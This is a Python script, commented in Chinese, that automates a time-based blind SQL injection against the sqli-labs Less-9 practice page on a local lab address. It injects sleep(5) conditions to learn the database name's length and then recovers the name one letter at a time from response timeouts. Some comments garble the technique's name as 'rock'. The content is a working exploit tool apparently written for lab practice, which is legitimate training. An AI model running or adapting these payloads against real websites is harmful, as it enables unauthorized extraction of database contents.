# 调用模块 
import requests
import string

urldef= "http://10.0.2.15/sqli-labs/Less-9/index.php"
# 定义 岩石 函数 ，如果 界面 返回超过三秒 ，则 返回timeout ,否则 返回 相应 内容  
def Timeout(url):     
    try:
        res = requests.get(url,timeout=3)
        return res.text

    except Exception as e:
        return "timeout"

'''
判断数据库长度
'''

dbname_num=0
while True:
    dbname_num +=1
    dbname_len = urldef+"?id=1'+and+if(length(database())="+str(dbname_num)+",sleep(5),1)--+"
    # 输入 URL ，返回 界面 显示 
    print(dbname_len)
    if "timeout" in Timeout(dbname_len):
        # 如果 函数返回  timeout 则判断 ，岩石注入  有效果
         print("The dB length eq : "+str(dbname_num))
         break

'''
得出数据库名称
    定义两个变量， i  和 char  用于两层循环 ，   i 是数字， char 是 小写字母
    

'''
dbname=""
for i  in  range(1,dbname_num+1):
    for char in string.ascii_lowercase:
        dbname_url = urldef+"?id=1'+and+if(substr(database(),"+str(i)+",1)='"+char+"',sleep(5),1)  --+"
        print (dbname_url)
        if "timeout" in Timeout(dbname_url):
            dbname +=char
            print ("The dbname is: "+dbname)
            break

         
        
